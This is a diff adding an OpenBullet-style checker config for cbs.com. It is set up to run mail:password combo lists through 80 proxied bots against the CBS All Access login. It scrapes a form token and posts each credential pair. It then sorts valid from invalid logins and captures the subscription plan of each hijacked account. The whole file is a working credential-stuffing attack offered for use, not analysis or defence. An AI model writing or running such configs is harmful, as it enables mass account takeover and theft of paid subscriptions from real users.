@@ -1,0 +1,69 @@
+[SETTINGS]
+{
+  "Name": "cbs.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-30T03:05:32.6840016+02:00",
+  "AdditionalInfo": "",
+  "Author": "samba",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.cbs.com/all-access/user/signin/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "=\"tk_trp\" value=\"" "\"" -> VAR "tk_trp" 
+
+REQUEST POST "https://www.cbs.com/account/login/" 
+  CONTENT "j_username=<USER>&j_password=<PASS>&_remember_me=1&tk_trp=<tk_trp>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "origin: https://www.cbs.com" 
+  HEADER "referer: https://www.cbs.com/all-access/user/signin/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid email and\\/or password" 
+  KEYCHAIN Success OR 
+    KEY "display_name" 
+
+REQUEST GET "https://www.cbs.com/all-access/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Try CBS All Access" 
+  KEYCHAIN Success OR 
+    KEY "Limited Commercials" 
+
+PARSE "<SOURCE>" LR "Limited Commercials " "</" -> CAP "Access Plan" 
+
